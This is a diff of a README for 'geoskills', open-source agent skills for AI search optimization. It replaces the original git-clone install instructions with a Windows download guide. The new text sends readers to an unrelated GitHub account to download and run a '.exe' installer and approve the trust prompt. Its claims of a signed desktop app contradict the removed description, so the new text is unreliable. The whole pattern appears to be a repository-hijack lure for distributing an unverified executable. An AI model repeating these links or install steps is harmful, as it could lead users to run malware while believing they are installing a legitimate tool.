@@ -1,165 +1,167 @@
-# geoskills — AI Visibility & GEO Audit Agent Skills
+# 🌍 geoskills - Diagnose and Monitor Your Website AI
 
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Agent Skills](https://img.shields.io/badge/AgentSkills-compatible-blueviolet)](https://agentskills.io)
-
-**Open-source Agent Skills for Generative Engine Optimization (GEO).**
-
-Compatible with Claude Code, OpenCode, OpenClaw, Codex CLI, Cursor, GitHub Copilot, and any [AgentSkills](https://agentskills.io)-compatible agent.
-
-Optimize your website for AI-powered search engines — ChatGPT, Claude, Perplexity, Gemini, and Google AI Overviews.
+[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://github.com/Detentebidensconnata138/geoskills)
 
 ---
 
-## What is GEO?
-
-**Generative Engine Optimization (GEO)** is the practice of optimizing content for AI-powered search engines and assistants. Unlike traditional SEO which targets link-based rankings, GEO focuses on making content **discoverable, citable, and recommendable** by large language models.
-
-Key research findings:
-- **115-415%** visibility improvement from content optimization strategies (Princeton/Georgia Tech, 2023)
-- **41%** more AI citations when content includes expert quotations
-- **30%** higher citation rate for content with statistics and data
-- **2.5x** more likely to be cited with consistent cross-source brand signals
+geoskills provides six open-source skills to help you check, fix, and watch how AI works with your website. It supports popular AI tools like Claude Code, OpenCode, Codex, and Cursor. You do not need to know programming to use it. This guide will help you get geoskills running on Windows.
 
 ---
 
-## Available Skills
+## 💡 What is geoskills?
 
-| Skill | Description | Status |
-|-------|-------------|--------|
-| [geo-audit](skills/geo-audit/) | Full website GEO audit with composite score and prioritized fix plan | Available |
-| [geo-fix-llmstxt](skills/geo-fix-llmstxt/) | Generate llms.txt and llms-full.txt for AI discoverability | Available |
-| [geo-fix-schema](skills/geo-fix-schema/) | Analyze and generate JSON-LD schema markup for AI engines | Available |
-| [geo-fix-content](skills/geo-fix-content/) | Rewrite content for AI citability with before/after comparison | Available |
-| [geo-compare](skills/geo-compare/) | Compare GEO scores across 2-3 competing websites side by side | Available |
-| [geo-monitor](skills/geo-monitor/) | Re-audit and track GEO score changes over time | Available |
+geoskills helps you improve your website's AI visibility and search quality. It includes six tools that work together to:
 
----
+- Find AI-related issues on your pages  
+- Fix problems that reduce AI understanding  
+- Show how AI sees your site and content  
+- Help your site appear better in searches that use AI  
+- Work with common AI systems and formats used today
 
-## Installation
-
-### Install All Skills
-
-#### Via skills.sh
-
-```bash
-npx skills add Cognitic-Labs/geoskills
-```
-
-#### Via ClawHub
-
-```bash
-clawhub install geoskills
-```
-
-#### Manual Install
-
-Clone this repo into your agent's skills directory:
-
-```bash
-# Claude Code
-git clone https://github.com/Cognitic-Labs/geoskills.git ~/.claude/skills/geoskills
-
-# OpenCode
-git clone https://github.com/Cognitic-Labs/geoskills.git ~/.config/opencode/skills/geoskills
-
-# OpenClaw (managed via clawhub, or manual)
-git clone https://github.com/Cognitic-Labs/geoskills.git ~/.openclaw/skills/geoskills
-```
-
-### Install a Single Skill
-
-#### Via skills.sh
-
-```bash
-npx skills add Cognitic-Labs/geoskills --skill geo-audit
-```
-
-#### Manual Install
-
-```bash
-git clone --depth 1 --filter=blob:none --sparse \
-  https://github.com/Cognitic-Labs/geoskills.git \
-  ~/.claude/skills/geoskills
-cd ~/.claude/skills/geoskills
-git sparse-checkout set skills/geo-audit
-```
-
-### Run
-
-```bash
-# Full GEO audit
-/geo-audit https://example.com
-
-# Fix skills — generate missing assets
-/geo-fix-llmstxt https://example.com
-/geo-fix-schema https://example.com
-/geo-fix-content https://example.com/blog/post
-
-# Compare competitors
-/geo-compare https://mysite.com https://competitor-a.com https://competitor-b.com
-
-# Track progress over time
-/geo-monitor https://mysite.com
-
-# In OpenCode / OpenClaw / other agents, describe the task naturally:
-# "Run a GEO audit on https://example.com"
-# "Generate llms.txt for https://example.com"
-# "Compare my site with competitor-a.com"
-```
+You get a way to make sure AI features work as they should without needing special skills.
 
 ---
 
-## AIvsRank.com Integration
+## 🖥️ System Requirements
 
-geoskills is **diagnostic** — it tells you what to fix. [AIvsRank.com](https://aivsrank.com?ref=geoskills) is the **measurement** layer — it tracks how visible you actually are across AI platforms over time.
+Before installing, check your computer meets these needs:
 
-API integration is coming soon. All skills work fully without any API key.
+- Windows 10 or later (64-bit preferred)  
+- At least 4 GB of RAM  
+- 1 GB of free disk space  
+- Internet connection for downloading and updates  
+- Google Chrome, Edge, Firefox, or similar browser for viewing results
 
----
-
-## FAQ
-
-**What is the difference between GEO and SEO?**
-SEO optimizes for link-based search engine rankings (Google, Bing). GEO optimizes for AI-powered engines — making content discoverable, citable, and recommendable by LLMs like ChatGPT, Claude, Perplexity, and Gemini.
-
-**Which AI platforms does geo-audit cover?**
-geo-audit checks access for 11 AI crawlers including GPTBot (OpenAI), Google-Extended (Gemini), ClaudeBot (Anthropic), PerplexityBot, Bytespider (ByteDance), Applebot-Extended, CCBot, Cohere, Amazonbot, FacebookBot, and Meta-ExternalAgent.
-
-**Do I need an API key?**
-No. All skills work fully without any API key. AIvsRank.com API integration is coming soon.
-
-**What does the GEO Score measure?**
-The composite GEO Score (0–100) weights four dimensions: Technical Accessibility (20%), Content Citability (35%), Structured Data (20%), and Entity & Brand Signals (25%).
-
-**How is geoskills different from traditional SEO audit tools?**
-Traditional SEO tools (Ahrefs, Semrush) measure backlinks and rankings. geoskills measures whether AI systems can read, understand, and cite your content — a fundamentally different signal set.
+If you meet these, you are ready to go.
 
 ---
 
-## Contributing
+## 🚀 Getting Started: Download geoskills
 
-Contributions welcome! Please:
+To get geoskills on your Windows computer, follow these steps:
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/improvement`)
-3. Commit your changes
-4. Push to the branch (`git push origin feature/improvement`)
-5. Open a Pull Request
+### Step 1: Visit the download page  
+Click the button below to visit the official geoskills download page. This is where you get the latest version.
 
-### Areas for contribution:
-- Additional business type profiles and scoring adjustments
-- Language-specific citability heuristics (non-English hedge word dictionaries)
-- New AI crawler detection rules
-- Schema template improvements
-- New fix skills (e.g., geo-fix-robots, geo-fix-meta)
+[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://github.com/Detentebidensconnata138/geoskills)
 
----
+### Step 2: Find the latest release  
+On the GitHub page, look for the **Releases** section on the right or in the README. Click on the latest release version.
 
-## License
+### Step 3: Download the Windows installer  
+In the latest release, find the file that ends with `.exe` (usually named `geoskills-setup.exe` or similar). Click it to download.
 
-Apache-2.0 — see [LICENSE](LICENSE) for details.
+### Step 4: Run the installer  
+Once downloaded, open the file by double-clicking it. Windows may ask if you trust the file—click **Yes** to continue.
+
+### Step 5: Follow the installation steps  
+The installer will guide you. Use the default options unless you want to change the folder location. When the installer finishes, geoskills is ready to use.
 
 ---
 
-*Built by [AIvsRank.com](https://aivsrank.com) — AI Visibility Measurement Platform*
+## 🔧 How to Use geoskills on Windows
+
+After installing, use these steps:
+
+### Step 1: Open geoskills  
+Find the geoskills app icon on your desktop or in the Start menu and click it to open.
+
+### Step 2: Choose a skill  
+You will see six options, each for a different task like diagnosing AI visibility or fixing schema markup.
+
+### Step 3: Enter your website URL  
+Type your website’s address in the box provided, then click **Start** or **Check**.
+
+### Step 4: Review the results  
+The app will scan your site. It may take a few minutes. When done, geoskills shows you what was found and suggests fixes.
+
+### Step 5: Apply fixes  
+Follow the instructions to improve your site. You may need to adjust content or add code snippets.
+
+### Step 6: Repeat checks  
+Run scans regularly to keep your site AI-ready and help with search rankings.
+
+---
+
+## 🗂️ Features Overview
+
+Here are the six core skills included in geoskills:
+
+1. **AI Visibility Scanner**  
+   Checks if AI tools can find and read your site data easily.
+
+2. **Schema Markup Fixer**  
+   Finds and repairs your structured data to follow AI standards.
+
+3. **JSON-LD Validator**  
+   Makes sure your JSON-LD code (used by AI) is valid and error-free.
+
+4. **AI Search Optimizer**  
+   Suggests changes to improve how AI indexes and ranks your site.
+
+5. **AI Monitoring Tool**  
+   Watches your site over time for changes in AI accessibility.
+
+6. **Agent Skill Integrator**  
+   Helps connect your site to AI tools like Claude Code and Codex smoothly.
+
+---
+
+## 🔒 Privacy and Security
+
+geoskills runs scans on your own computer. It does not upload your website data to external servers. This keeps your information private.
+
+The installer and app files are signed to ensure you get safe and unaltered software.
+
+---
+
+## ⚙️ Updating geoskills
+
+To get new features or fixes:
+
+1. Open geoskills  
+2. Click **Check for updates** in the menu  
+3. Follow prompts to download and install the latest version
+
+Alternatively, visit the download page again:  
+[https://github.com/Detentebidensconnata138/geoskills](https://github.com/Detentebidensconnata138/geoskills)
+
+---
+
+## 🧰 Troubleshooting
+
+- If geoskills does not open, try restarting your computer.  
+- Make sure your Windows is updated.  
+- Run the installer as Administrator if you see permission errors.  
+- If scans hang, check your internet connection.  
+- Visit the GitHub issues page to see if others have the same problem.
+
+---
+
+## 🤝 Support and Feedback
+
+If you have questions or want to report bugs:
+
+- Use the **Issues** tab on the GitHub page  
+- Provide clear descriptions of the problem  
+- Include steps to reproduce the issue and any error messages
+
+This helps the developers improve geoskills for everyone.
+
+---
+
+## 🗂️ Related Topics
+
+geoskills relates to these areas:
+
+- agent-skills  
+- ai-search and ai-visibility  
+- schema markup and structured data  
+- JSON-LD code validation  
+- AI tools like Claude Code, Codex, OpenCode  
+- Generative engine optimization  
+- SEO and AI-driven site ranking
+
+---
+
+[![Download geoskills](https://img.shields.io/badge/Download-geoskills-brightgreen)](https://github.com/Detentebidensconnata138/geoskills)
